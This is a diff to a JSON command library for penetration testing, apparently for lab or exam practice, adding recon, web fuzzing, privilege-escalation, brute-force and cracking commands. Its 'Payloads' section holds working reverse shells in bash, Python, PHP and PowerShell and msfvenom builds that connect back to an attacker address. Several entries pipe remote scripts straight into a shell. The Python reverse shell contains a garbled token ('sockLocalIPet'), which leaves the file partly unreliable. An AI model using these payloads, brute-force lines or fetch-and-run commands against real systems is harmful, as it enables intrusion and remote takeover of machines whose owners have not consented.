@@ -37,11 +37,6 @@
   {
     "label": "ls",
     "command": "ls",
-    "category": "SMB"
-  },
-  {
-    "label": "ls",
-    "command": "ls",
     "category": "Misc"
   },
   {
@@ -52,11 +47,6 @@
   {
     "label": "xfreerdp",
     "command": "xfreerdp /u:offsec /p:lab /v:<$IP> /size:75%  /cert:ignore  +drive:smbfolder,/home/",
-    "category": "Misc"
-  },
-  {
-    "label": "test6",
-    "command": "ls",
     "category": "Misc"
   },
   {
@@ -71,12 +61,12 @@
   },
   {
     "label": "ffuf80",
-    "command": "ffuf -w ~/directoryFUZZ/raft-large-directories.txt -u http://<$IP>/FUZZ",
+    "command": "ffuf -w ~/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://<$IP>/FUZZ",
     "category": "Web"
   },
   {
     "label": "ffufHost443",
-    "command": "ffuf -w ~/directoryFUZZ/raft-large-directories.txt -u http://<$HOST>/FUZZ/",
+    "command": "ffuf -w ~/SecLists/Discovery/Web-Content/raft-large-directories.txt -u http://<$HOST>/FUZZ/",
     "category": "Web"
   },
   {
@@ -97,6 +87,311 @@
   {
     "label": "whoami",
     "command": "whoami /all",
-    "category": "WinPrivESC"
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "Nmap Script Scan",
+    "command": "sudo nmap -sC -sV -O -A --script=vuln <$IP>",
+    "category": "Recon"
+  },
+  {
+    "label": "Nmap TCP Top 1000",
+    "command": "sudo nmap -sS -T4 --top-ports 1000 <$IP>",
+    "category": "Recon"
+  },
+  {
+    "label": "Rustscan Fast",
+    "command": "rustscan -a <$IP> -- -sC -sV",
+    "category": "Recon"
+  },
+  {
+    "label": "Masscan Fast",
+    "command": "sudo masscan -p1-65535 <$IP> --rate=1000",
+    "category": "Recon"
+  },
+  {
+    "label": "DNS Enumeration",
+    "command": "dig @<$IP> <$HOST> ANY",
+    "category": "Recon"
+  },
+  {
+    "label": "DNSenum",
+    "command": "dnsenum <$HOST>",
+    "category": "Recon"
+  },
+  {
+    "label": "Gobuster Dir",
+    "command": "gobuster dir -u http://<$HOST> -w ~/SecLists/Discovery/Web-Content/common.txt -x php,html,txt,js",
+    "category": "Web"
+  },
+  {
+    "label": "Gobuster DNS",
+    "command": "gobuster dns -d <$HOST> -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt",
+    "category": "Web"
+  },
+  {
+    "label": "Dirbuster Wordlist",
+    "command": "dirb http://<$HOST>/ ~/SecLists/Discovery/Web-Content/raft-large-directories.txt",
+    "category": "Web"
+  },
+  {
+    "label": "Wfuzz Subdomain",
+    "command": "wfuzz -c -w ~/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<$HOST>' --hh 0 http://<$IP>/",
+    "category": "Web"
+  },
+  {
+    "label": "SQLMap Basic",
+    "command": "sqlmap -u 'http://<$HOST>/page.php?id=1' --batch --dbs",
+    "category": "Web"
+  },
+  {
+    "label": "Burp Suite",
+    "command": "burpsuite",
+    "category": "Web"
+  },
+  {
+    "label": "Whatweb",
+    "command": "whatweb http://<$HOST>",
+    "category": "Web"
+  },
+  {
+    "label": "Wafw00f",
+    "command": "wafw00f http://<$HOST>",
+    "category": "Web"
+  },
+  {
+    "label": "LinPEAS",
+    "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "LinEnum",
+    "command": "curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "Linux Smart Enumeration",
+    "command": "curl -L https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh | bash",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "SUID Files",
+    "command": "find / -perm -u=s -type f 2>/dev/null",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "SGID Files",
+    "command": "find / -perm -g=s -type f 2>/dev/null",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "World Writable",
+    "command": "find / -writable -type d 2>/dev/null",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "Cron Jobs",
+    "command": "cat /etc/crontab && ls -la /etc/cron*",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "Active Connections",
+    "command": "ss -tuln",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "Running Processes",
+    "command": "ps aux | grep -E '(root|mysql|www-data)'",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "WinPEAS",
+    "command": "powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1')\"",
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "PowerUp",
+    "command": "powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks\"",
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "Privilege Check",
+    "command": "whoami /priv",
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "System Info",
+    "command": "systeminfo",
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "Installed Software",
+    "command": "wmic product get name,version",
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "Network Config",
+    "command": "ipconfig /all",
+    "category": "WinPrivEsc"
+  },
+  {
+    "label": "Netcat Listener 443",
+    "command": "sudo nc -lvnp 443",
+    "category": "Listeners"
+  },
+  {
+    "label": "Netcat Listener 4444",
+    "command": "sudo nc -lvnp 4444",
+    "category": "Listeners"
+  },
+  {
+    "label": "Netcat Listener Custom",
+    "command": "sudo nc -lvnp <$PORT>",
+    "category": "Listeners"
+  },
+  {
+    "label": "Python Server 8000",
+    "command": "python3 -m http.server 8000",
+    "category": "Listeners"
+  },
+  {
+    "label": "SMB Server",
+    "command": "sudo impacket-smbserver share . -smb2support",
+    "category": "Listeners"
+  },
+  {
+    "label": "FTP Server",
+    "command": "sudo python3 -m pyftpdlib -p 21",
+    "category": "Listeners"
+  },
+  {
+    "label": "Reverse Shell Bash",
+    "command": "bash -i >& /dev/tcp/<$LocalIP>/4444 0>&1",
+    "category": "Payloads"
+  },
+  {
+    "label": "Reverse Shell Python",
+    "command": "python3 -c 'import socket,subprocess,os;s=sockLocalIPet.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<$LocalIP>\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+    "category": "Payloads"
+  },
+  {
+    "label": "PHP Reverse Shell",
+    "command": "php -r '$sock=fsockopen(\"<$LocalIP>\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+    "category": "Payloads"
+  },
+  {
+    "label": "PowerShell Reverse Shell",
+    "command": "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('<$LocalIP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
+    "category": "Payloads"
+  },
+  {
+    "label": "MSFVenom Linux x64",
+    "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST=<$LocalIP> LPORT=4444 -f elf > shell.elf",
+    "category": "Payloads"
+  },
+  {
+    "label": "MSFVenom Windows x64",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<$LocalIP> LPORT=4444 -f exe > shell.exe",
+    "category": "Payloads"
+  },
+  {
+    "label": "MSFVenom PHP",
+    "command": "msfvenom -p php/reverse_php LHOST=<$LocalIP> LPORT=4444 -f raw > shell.php",
+    "category": "Payloads"
+  },
+  {
+    "label": "Base64 Decode",
+    "command": "echo 'BASE64_STRING' | base64 -d",
+    "category": "Crypto"
+  },
+  {
+    "label": "Base64 Encode",
+    "command": "echo 'PLAINTEXT' | base64",
+    "category": "Crypto"
+  },
+  {
+    "label": "URL Decode",
+    "command": "python3 -c 'import urllib.parse; print(urllib.parse.unquote(\"URL_ENCODED_STRING\"))'",
+    "category": "Crypto"
+  },
+  {
+    "label": "ROT13",
+    "command": "echo 'TEXT' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
+    "category": "Crypto"
+  },
+  {
+    "label": "MD5 Hash",
+    "command": "echo -n 'TEXT' | md5sum",
+    "category": "Crypto"
+  },
+  {
+    "label": "SHA256 Hash",
+    "command": "echo -n 'TEXT' | sha256sum",
+    "category": "Crypto"
+  },
+  {
+    "label": "John the Ripper",
+    "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+    "category": "Crypto"
+  },
+  {
+    "label": "Hashcat MD5",
+    "command": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+    "category": "Crypto"
+  },
+  {
+    "label": "SSH Bruteforce",
+    "command": "hydra -l <$Username> -P /usr/share/wordlists/rockyou.txt <$IP> ssh",
+    "category": "BruteForce"
+  },
+  {
+    "label": "FTP Bruteforce",
+    "command": "hydra -l <$Username> -P /usr/share/wordlists/rockyou.txt <$IP> ftp",
+    "category": "BruteForce"
+  },
+  {
+    "label": "HTTP Basic Auth",
+    "command": "hydra -l <$Username> -P /usr/share/wordlists/rockyou.txt <$IP> http-get /admin",
+    "category": "BruteForce"
+  },
+  {
+    "label": "SMB Bruteforce",
+    "command": "hydra -l <$Username> -P /usr/share/wordlists/rockyou.txt <$IP> smb",
+    "category": "BruteForce"
+  },
+  {
+    "label": "RDP Bruteforce",
+    "command": "hydra -l <$Username> -P /usr/share/wordlists/rockyou.txt rdp://<$IP>",
+    "category": "BruteForce"
+  },
+  {
+    "label": "SSH Key Gen",
+    "command": "ssh-keygen -t rsa -b 4096 -f id_rsa",
+    "category": "Misc"
+  },
+  {
+    "label": "Curl with Headers",
+    "command": "curl -v -H 'User-Agent: CustomAgent' http://<$HOST>",
+    "category": "Web"
+  },
+  {
+    "label": "Wget Recursive",
+    "command": "wget -r -np -k http://<$HOST>/",
+    "category": "Web"
+  },
+  {
+    "label": "Find Files by Extension",
+    "command": "find / -name '*.conf' -type f 2>/dev/null",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "Check Capabilities",
+    "command": "getcap -r / 2>/dev/null",
+    "category": "LinuxPrivEsc"
+  },
+  {
+    "label": "TTY Upgrade",
+    "command": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
+    "category": "Misc"
   }
 ]
